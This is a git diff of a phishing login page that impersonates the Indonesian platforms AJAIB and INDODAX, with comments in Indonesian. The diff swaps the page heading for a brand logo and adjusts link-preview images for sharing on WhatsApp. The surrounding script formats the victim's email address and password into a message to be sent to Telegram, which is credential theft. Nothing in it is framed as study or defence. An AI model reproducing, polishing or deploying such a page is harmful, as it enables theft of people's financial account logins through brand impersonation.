@@ -8,7 +8,7 @@
 <!-- Meta Tags untuk Open Graph (agar gambar INDODAX muncul saat share link ke WhatsApp) -->
 <meta property="og:title" content="Masuk ke AJAIB" />
 <meta property="og:description" content="Login ke akun AJAIB Anda dengan aman." />
-<meta property="og:image" content="https://i.ibb.co.com/HfkBKY6W/images.png" /><!-- Gambar INDODAX dari link Anda -->
+<meta property="og:image" content="https://ibb.co.com/MDpxTf7d" /><!-- Gambar INDODAX dari link Anda -->
 <meta property="og:url" content="https://indodax-log.vercel.app/" /> <!-- Ganti dengan URL halaman Anda yang sebenarnya -->
 <meta property="og:type" content="website" />
 
@@ -25,10 +25,13 @@
     max-width: 360px;
     margin: 0 auto;
   }
-  h1 {
-    font-weight: 700;
-    font-size: 24px;
+  .logo {
+    width: 100px; /* Sesuaikan ukuran logo sesuai kebutuhan */
+    height: auto;
     margin-bottom: 32px;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
   }
   label {
     display: block;
@@ -128,7 +131,8 @@
 </head>
 <body>
   <div class="container">
-    <h1>Masuk ke AJAIB</h1>
+    <!-- Ganti h1 dengan logo gambar -->
+    <img src="https://ibb.co.com/MDpxTf7d" alt="Logo AJAIB" class="logo" />
 
     <form id="loginForm" novalidate>
       <label for="email">Alamat Email</label>
@@ -226,7 +230,7 @@
 
           // Format pesan untuk dikirim ke Telegram
           const message = `
-Masuk ke INDODAX
+Masuk ke AJAIB
 ------------------------
 Alamat Email: ${email}
 Kata Sandi: ${password}
